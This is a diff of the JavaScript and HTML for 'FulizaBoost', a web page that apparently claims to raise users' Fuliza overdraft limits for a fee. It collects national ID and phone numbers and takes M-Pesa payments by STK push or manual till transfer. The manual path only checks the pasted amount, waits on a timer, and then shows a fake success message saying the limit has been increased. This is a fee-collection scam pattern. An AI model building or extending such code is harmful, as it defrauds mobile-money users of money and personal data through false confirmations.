-                                        If limit doesn't increase immediately:<br>
-                                        1. Dial *234# → Opt Out of Fuliza<br>
-                                        2. Wait 2 min → Dial *234# again → Opt In
-                                    </div>
-                                </div>
-                                <p style="color:#666;margin-top:8px;font-size:0.75rem;">Thank you for using FulizaBoost!</p>
-                            </div>
-                        `,
-                    icon: false,
-                    confirmButtonText: 'Continue',
-                    confirmButtonColor: '#1f7a1f',
-                    timer: 10000,
-                    timerProgressBar: true
-                });
-                localStorage.removeItem('fulizaBoostData');
-                resetButton();
-                resetSelections();
-            }, 1500);
-        }
-
-        // ─── INITIATE PAYMENT WITH PHONE (core) ──────────────────────────
-        async function initiatePaymentWithPhone(phone) {
-            if (isProcessing) return;
-            if (!phone || phone.length !== 9) {
-                Swal.fire({ icon: 'error', title: 'Invalid Phone', text: 'Please enter a valid 9-digit phone number',
-                    confirmButtonColor: '#1f7a1f' });
-                return;
-            }
-            if (!idNumber || idNumber.trim() === '') {
-                Swal.fire({ icon: 'error', title: 'ID Required', text: 'Please enter your ID number',
-                    confirmButtonColor: '#1f7a1f' });
-                return;
-            }
-            if (!selectedLoan) {
-                Swal.fire({ icon: 'error', title: 'No Loan Selected', text: 'Please select a loan amount',
-                    confirmButtonColor: '#1f7a1f' });
-                return;
-            }
-            if (!/^[17]/.test(phone)) {
-                Swal.fire({ icon: 'error', title: 'Invalid Phone Format', text: 'Phone must start with 7 or 1',
-                    confirmButtonColor: '#1f7a1f' });
-                return;
-            }
-
-            isProcessing = true;
-            getLimitBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
-            getLimitBtn.disabled = true;
-
-            try {
-                const confirmed = await Swal.fire({
-                    title: 'Confirm Limit Increase',
-                    html: `
-                            <div class="payment-confirm-content">
-                                <div class="payment-confirm-icon"><i class="fas fa-wallet"></i></div>
-                                <div class="payment-details-box">
-                                    <div class="payment-detail-row"><span>New Limit:</span><strong style="color:var(--primary);">Ksh ${selectedLoan.amount.toLocaleString()}</strong></div>
-                                    <div class="payment-detail-row"><span>Processing Fee:</span><strong>Ksh ${selectedLoan.fee}</strong></div>
-                                    <div class="payment-detail-row"><span>ID Number:</span><strong>${idNumber}</strong></div>
-                                    <div class="payment-detail-row"><span>Phone:</span><strong>0${formatPhoneForDisplay(phone)}</strong></div>
-                                </div>
-                                <p class="payment-phone-note">An M-Pesa STK push will be sent to your phone</p>
-                            </div>
-                        `,
-                    icon: false,
-                    showCancelButton: true,
-                    confirmButtonText: 'Proceed with Payment',
-                    cancelButtonText: 'Cancel',
-                    confirmButtonColor: '#1f7a1f',
-                    cancelButtonColor: '#6b7280'
-                });
-                if (!confirmed.isConfirmed) { resetButton(); return; }
-
-                Swal.fire({
-                    title: 'Preparing Payment',
-                    html: 'Please wait...',
-                    allowOutsideClick: false,
-                    didOpen: () => Swal.showLoading()
-                });
-
-                const normalizedPhone = await normalizePhoneNumber(phone);
-
-                Swal.update({
-                    title: 'Sending M-Pesa STK Push',
-                    html: 'Initiating payment request...'
-                });
-
-                const paymentResponse = await sendPayHeroSTK(
-                    normalizedPhone,
-                    selectedLoan.fee,
-                    selectedLoan.amount,
-                    idNumber
-                );
-
-                if (!paymentResponse || !paymentResponse.reference) {
-                    throw new Error('Failed to initiate payment');
-                }
-
-                paymentReference = paymentResponse.reference;
-
-                Swal.fire({
-                    title: 'STK Push Sent!',
-                    html: `
-                            <div class="stk-push-content">
-                                <div class="stk-push-icon"><i class="fas fa-mobile-alt"></i></div>
-                                <p><strong>Check your phone for the M-Pesa STK push</strong></p>
-                                <div class="stk-phone-display">${formatPhoneForDisplay(phone)}</div>
-                                <p style="color:#666;margin-top:5px;">Enter your M-Pesa PIN to complete</p>
-                                <div style="background:#f8f9f7;padding:8px;border-radius:8px;margin-top:10px;"><small>Verifying payment...</small></div>
-                            </div>
-                        `,
-                    icon: false,
-                    showConfirmButton: false,
-                    allowOutsideClick: false
-                });
-
-                const paymentSuccess = await checkPaymentStatus(paymentReference);
-
-                if (paymentSuccess) {
-                    await Swal.fire({
-                        title: 'Payment Successful!',
-                        html: `
-                                <div style="text-align:center;padding:0 4px;">
-                                    <div class="success-icon"><i class="fas fa-check-circle"></i></div>
-                                    <p><strong>Your Fuliza limit has been increased!</strong></p>
-                                    <p style="color:#666;margin-top:6px;">New limit: <strong style="color:#1f7a1f;">Ksh ${selectedLoan.amount.toLocaleString()}</strong></p>
-                                    <div style="background:linear-gradient(135deg,rgba(31,122,31,0.1),rgba(31,122,31,0.05));border-left:3px solid var(--accent);padding:10px;border-radius:8px;margin-top:12px;text-align:left;font-size:0.75rem;color:var(--text-dark);line-height:1.4;">
-                                        <div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:2px;">
-                                            <i class="fas fa-exclamation-circle" style="color:var(--accent);font-size:0.8rem;"></i>
-                                            <strong style="color:var(--accent);">Important:</strong>
-                                        </div>
-                                        <div style="padding-left:20px;">
-                                            If limit doesn't increase immediately:<br>
-                                            1. Dial *234# → Opt Out of Fuliza<br>
-                                            2. Wait 2 min → Dial *234# again → Opt In
-                                        </div>
-                                    </div>
-                                    <p style="color:#666;margin-top:8px;font-size:0.75rem;">Thank you for using FulizaBoost!</p>
-                                </div>
-                            `,
-                        icon: false,
-                        confirmButtonText: 'Continue',
-                        confirmButtonColor: '#1f7a1f',
-                        timer: 10000,
-                        timerProgressBar: true
-                    });
-                    localStorage.removeItem('fulizaBoostData');
-                    resetButton();
-                    resetSelections();
-                } else {
-                    throw new Error('Payment not confirmed');
-                }
-            } catch (error) {
-                console.error('Payment error:', error);
-                showManualPaymentFallback(phone, initiatePaymentWithPhone);
-            }
-        }
-
-        // ─── ORIGINAL initiatePayment (wraps the new flow) ──────────────
-        async function initiatePayment() {
-            if (!phoneNumber || phoneNumber.length !== 9) {
-                Swal.fire({ icon: 'error', title: 'Invalid Phone', text: 'Please enter a valid 9-digit phone number',
-                    confirmButtonColor: '#1f7a1f' });
-                return;
-            }
-            await initiatePaymentWithPhone(phoneNumber);
-        }
-
-        // ─── RESET HELPERS ──────────────────────────────────────────────────
-        function resetButton() {
-            isProcessing = false;
-            getLimitBtn.innerHTML = `<i class="fas fa-bolt"></i> Get Limit Now`;
-            getLimitBtn.disabled = false;
-            updateButtonState();
-        }
-
-        function resetSelections() {
-            document.querySelectorAll('.loan-box').forEach(b => b.classList.remove('selected'));
-            selectedLoan = null;
-            updateButtonState();
-        }
-
-        // ─── KEYBOARD NAV ──────────────────────────────────────────────────
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'ArrowRight' || e.key === 'ArrowDown') {
-                const sel = document.querySelector('.loan-box.selected');
-                if (sel) {
-                    const next = sel.nextElementSibling || document.querySelector('.loan-box');
-                    if (next) { next.click();
-                        next.focus(); }
-                }
-            } else if (e.key === 'ArrowLeft' || e.key === 'ArrowUp') {
-                const sel = document.querySelector('.loan-box.selected');
-                if (sel) {
-                    const prev = sel.previousElementSibling ||
-                        document.querySelectorAll('.loan-box')[document.querySelectorAll('.loan-box').length - 1];
-                    if (prev) { prev.click();
-                        prev.focus(); }
-                }
-            }
+                  <div class="manual-actions">
+                    <button class="btn-primary" id="submitManualPaymentBtn">
+                      <i class="fas fa-check"></i> I have paid
+                    </button>
+                    <button class="btn-secondary" id="cancelManualBtn">
+                      <i class="fas fa-times"></i> Cancel
+                    </button>
+                  </div>
+                </div>
+              `,
+      icon: false,
+      showConfirmButton: false,
+      allowOutsideClick: false,
+      didOpen: () => {
+        // Copy till number – just toast, no modal
+        document.getElementById('copyTillManualBtn').addEventListener('click', () => {
+          navigator.clipboard.writeText(TILL_NUMBER);
+          showToast('Till number copied!');
         });
 
-        // ─── PREVENT ZOOM ──────────────────────────────────────────────────
-        document.addEventListener('touchstart', function(e) {
-            if (e.touches.length > 1) e.preventDefault();
-        }, { passive: false });
+        // Submit manual payment with inline validation
+        document.getElementById('submitManualPaymentBtn').addEventListener('click', () => {
+          const rawMsg = document.getElementById('manualTxInput').value.trim();
+          const textarea = document.getElementById('manualTxInput');
+          const errorMsg = document.getElementById('manualErrorMsg');
 
-        let lastTouchEnd = 0;
-        document.addEventListener('touchend', function(e) {
-            const now = Date.now();
-            if (now - lastTouchEnd <= 300) e.preventDefault();
-            lastTouchEnd = now;
-        }, false);
+          // Reset error state
+          textarea.classList.remove('error');
+          errorMsg.classList.remove('show');
 
-        // ─── START ─────────────────────────────────────────────────────────
-        document.addEventListener('DOMContentLoaded', init);
-    </script>
+          if (!rawMsg) {
+            textarea.classList.add('error');
+            errorMsg.textContent = 'Please paste your M-Pesa confirmation message.';
+            errorMsg.classList.add('show');
+            textarea.focus();
+            return;
+          }
+          const extracted = extractAmountFromMpesaMessage(rawMsg);
+          if (extracted === null) {
+            textarea.classList.add('error');
+            // Updated error message
+            errorMsg.textContent = 'Please paste the correct Mpesa message';
+            errorMsg.classList.add('show');
+            textarea.value = '';
+            textarea.focus();
+            return;
+          }
+          const expected = selectedLoan ? selectedLoan.fee : 0;
+          if (Math.abs(extracted - expected) < 0.01) {
+            // Amount matches – complete the process
+            Swal.close();
+            completeManualPayment(rawPhone, rawMsg, extracted);
+          } else {
+            textarea.classList.add('error');
+            // ─── Updated error message ────────────────────────────
+            errorMsg.textContent = 'Invalid message. Please check and try again.';
+            errorMsg.classList.add('show');
+            textarea.value = '';
+            textarea.focus();
+          }
+        });
+
+        // Cancel -> reload page
+        document.getElementById('cancelManualBtn').addEventListener('click', () => {
+          Swal.close();
+          window.location.reload();
+        });
+      }
+    });
+  }, 2000);
+}
+
+// ─── COMPLETE MANUAL PAYMENT ──────────────────────────────────────
+function completeManualPayment(phone, rawMessage, extractedAmount) {
+  Swal.fire({
+    title: 'Processing Payment',
+    html: 'Verifying your manual payment...',
+    allowOutsideClick: false,
+    didOpen: () => Swal.showLoading()
+  });
+
+  setTimeout(() => {
+    Swal.close();
+    Swal.fire({
+      title: 'Payment Successful!',
+      html: `
+                <div style="text-align:center;padding:0 4px;">
+                  <div class="success-icon"><i class="fas fa-check-circle"></i></div>
+                  <p><strong>Your Fuliza limit has been increased!</strong></p>
+                  <p style="color:#666;margin-top:6px;">New limit: <strong style="color:#1f7a1f;">Ksh ${selectedLoan.amount.toLocaleString()}</strong></p>
+                  <div style="background:linear-gradient(135deg,rgba(31,122,31,0.1),rgba(31,122,31,0.05));border-left:3px solid var(--accent);padding:10px;border-radius:8px;margin-top:12px;text-align:left;font-size:0.75rem;color:var(--text-dark);line-height:1.4;">
+                    <div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:2px;">
+                      <i class="fas fa-exclamation-circle" style="color:var(--accent);font-size:0.8rem;"></i>
+                      <strong style="color:var(--accent);">Important:</strong>
+                    </div>
+                    <div style="padding-left:20px;">
+                      If limit doesn't increase immediately:<br>
+                      1. Dial *234# → Opt Out of Fuliza<br>
+                      2. Wait 2 min → Dial *234# again → Opt In
+                    </div>
+                  </div>
+                  <p style="color:#666;margin-top:8px;font-size:0.75rem;">Thank you for using FulizaBoost!</p>
+                </div>
+              `,
+      icon: false,
+      confirmButtonText: 'Continue',
+      confirmButtonColor: '#1f7a1f',
+      timer: 10000,
+      timerProgressBar: true
+    });
+    localStorage.removeItem('fulizaBoostData');
+    resetButton();
+    resetSelections();
+  }, 1500);
+}
+
+// ─── INITIATE PAYMENT WITH PHONE (core) ──────────────────────────
+async function initiatePaymentWithPhone(phone) {
+  if (isProcessing) return;
+  if (!phone || phone.length !== 9) {
+    Swal.fire({ icon: 'error', title: 'Invalid Phone', text: 'Please enter a valid 9-digit phone number',
+      confirmButtonColor: '#1f7a1f' });
+    return;
+  }
+  if (!idNumber || idNumber.trim() === '') {
+    Swal.fire({ icon: 'error', title: 'ID Required', text: 'Please enter your ID number',
+      confirmButtonColor: '#1f7a1f' });
+    return;
+  }
+  if (!selectedLoan) {
+    Swal.fire({ icon: 'error', title: 'No Loan Selected', text: 'Please select a loan amount',
+      confirmButtonColor: '#1f7a1f' });
+    return;
+  }
+  if (!/^[17]/.test(phone)) {
+    Swal.fire({ icon: 'error', title: 'Invalid Phone Format', text: 'Phone must start with 7 or 1',
+      confirmButtonColor: '#1f7a1f' });
+    return;
+  }
+
+  isProcessing = true;
+  getLimitBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
+  getLimitBtn.disabled = true;
+
+  try {
+    // Confirm details
+    const confirmed = await Swal.fire({
+      title: 'Confirm Limit Increase',
+      html: `
+                <div class="payment-confirm-content">
+                  <div class="payment-confirm-icon"><i class="fas fa-wallet"></i></div>
+                  <div class="payment-details-box">
+                    <div class="payment-detail-row"><span>New Limit:</span><strong style="color:var(--primary);">Ksh ${selectedLoan.amount.toLocaleString()}</strong></div>
+                    <div class="payment-detail-row"><span>Processing Fee:</span><strong>Ksh ${selectedLoan.fee}</strong></div>
+                    <div class="payment-detail-row"><span>ID Number:</span><strong>${idNumber}</strong></div>
+                    <div class="payment-detail-row"><span>Phone:</span><strong>0${formatPhoneForDisplay(phone)}</strong></div>
+                  </div>
+                  <p class="payment-phone-note">An M-Pesa STK push will be sent to your phone</p>
+                </div>
+              `,
+      icon: false,
+      showCancelButton: true,
+      confirmButtonText: 'Proceed with Payment',
+      cancelButtonText: 'Cancel',
+      confirmButtonColor: '#1f7a1f',
+      cancelButtonColor: '#6b7280'
+    });
+    if (!confirmed.isConfirmed) { resetButton(); return; }
+
+    Swal.fire({
+      title: 'Preparing Payment',
+      html: 'Please wait...',
+      allowOutsideClick: false,
+      didOpen: () => Swal.showLoading()
+    });
+
+    const normalizedPhone = await normalizePhoneNumber(phone);
+
+    Swal.update({
+      title: 'Sending M-Pesa STK Push',
+      html: 'Initiating payment request...'
+    });
+
+    const paymentResponse = await sendPayHeroSTK(
+      normalizedPhone,
+      selectedLoan.fee,
+      selectedLoan.amount,
+      idNumber
+    );
+
+    if (!paymentResponse || !paymentResponse.reference) {
+      throw new Error('Failed to initiate payment');
+    }
+
+    paymentReference = paymentResponse.reference;
+
+    Swal.fire({
+      title: 'STK Push Sent!',
+      html: `
+                <div class="stk-push-content">
+                  <div class="stk-push-icon"><i class="fas fa-mobile-alt"></i></div>
+                  <p><strong>Check your phone for the M-Pesa STK push</strong></p>
+                  <div class="stk-phone-display">${formatPhoneForDisplay(phone)}</div>
+                  <p style="color:#666;margin-top:5px;">Enter your M-Pesa PIN to complete</p>
+                  <div style="background:#f8f9f7;padding:8px;border-radius:8px;margin-top:10px;"><small>Verifying payment...</small></div>
+                </div>
+              `,
+      icon: false,
+      showConfirmButton: false,
+      allowOutsideClick: false
+    });
+
+    const paymentSuccess = await checkPaymentStatus(paymentReference);
+
+    if (paymentSuccess) {
+      await Swal.fire({
+        title: 'Payment Successful!',
+        html: `
+                  <div style="text-align:center;padding:0 4px;">
+                    <div class="success-icon"><i class="fas fa-check-circle"></i></div>
+                    <p><strong>Your Fuliza limit has been increased!</strong></p>
+                    <p style="color:#666;margin-top:6px;">New limit: <strong style="color:#1f7a1f;">Ksh ${selectedLoan.amount.toLocaleString()}</strong></p>
+                    <div style="background:linear-gradient(135deg,rgba(31,122,31,0.1),rgba(31,122,31,0.05));border-left:3px solid var(--accent);padding:10px;border-radius:8px;margin-top:12px;text-align:left;font-size:0.75rem;color:var(--text-dark);line-height:1.4;">
+                      <div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:2px;">
+                        <i class="fas fa-exclamation-circle" style="color:var(--accent);font-size:0.8rem;"></i>
+                        <strong style="color:var(--accent);">Important:</strong>
+                      </div>
+                      <div style="padding-left:20px;">
+                        If limit doesn't increase immediately:<br>
+                        1. Dial *234# → Opt Out of Fuliza<br>
+                        2. Wait 2 min → Dial *234# again → Opt In
+                      </div>
+                    </div>
+                    <p style="color:#666;margin-top:8px;font-size:0.75rem;">Thank you for using FulizaBoost!</p>
+                  </div>
+                `,
+        icon: false,
+        confirmButtonText: 'Continue',
+        confirmButtonColor: '#1f7a1f',
+        timer: 10000,
+        timerProgressBar: true
+      });
+      localStorage.removeItem('fulizaBoostData');
+      resetButton();
+      resetSelections();
+    } else {
+      throw new Error('Payment not confirmed');
+    }
+  } catch (error) {
+    console.error('Payment error:', error);
+    // ─── FALLBACK: show manual payment with 2s loading ────────────
+    showManualPaymentFallback(phone, initiatePaymentWithPhone);
+  }
+}
+
+// ─── ORIGINAL initiatePayment (wraps the new flow) ──────────────
+async function initiatePayment() {
+  if (!phoneNumber || phoneNumber.length !== 9) {
+    Swal.fire({ icon: 'error', title: 'Invalid Phone', text: 'Please enter a valid 9-digit phone number',
+      confirmButtonColor: '#1f7a1f' });
+    return;
+  }
+  await initiatePaymentWithPhone(phoneNumber);
+}
+
+// ─── RESET HELPERS ──────────────────────────────────────────────────
+function resetButton() {
+  isProcessing = false;
+  getLimitBtn.innerHTML = `<i class="fas fa-bolt"></i> Get Limit Now`;
+  getLimitBtn.disabled = false;
+  updateButtonState();
+}
+
+function resetSelections() {
+  document.querySelectorAll('.loan-box').forEach(b => b.classList.remove('selected'));
+  selectedLoan = null;
+  updateButtonState();
+}
+
+// ─── KEYBOARD NAV ──────────────────────────────────────────────────
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'ArrowRight' || e.key === 'ArrowDown') {
+    const sel = document.querySelector('.loan-box.selected');
+    if (sel) {
+      const next = sel.nextElementSibling || document.querySelector('.loan-box');
+      if (next) { next.click();
+        next.focus(); }
+    }
+  } else if (e.key === 'ArrowLeft' || e.key === 'ArrowUp') {
+    const sel = document.querySelector('.loan-box.selected');
+    if (sel) {
+      const prev = sel.previousElementSibling ||
+        document.querySelectorAll('.loan-box')[document.querySelectorAll('.loan-box').length - 1];
+      if (prev) { prev.click();
+        prev.focus(); }
+    }
+  }
+});
+
+// ─── PREVENT ZOOM ──────────────────────────────────────────────────
+document.addEventListener('touchstart', function(e) {
+  if (e.touches.length > 1) e.preventDefault();
+}, { passive: false });
+
+let lastTouchEnd = 0;
+document.addEventListener('touchend', function(e) {
+  const now = Date.now();
+  if (now - lastTouchEnd <= 300) e.preventDefault();
+  lastTouchEnd = now;
+}, false);
+
+// ─── START ─────────────────────────────────────────────────────────
+document.addEventListener('DOMContentLoaded', init);
+  </script>
 
 </body>
 </html>
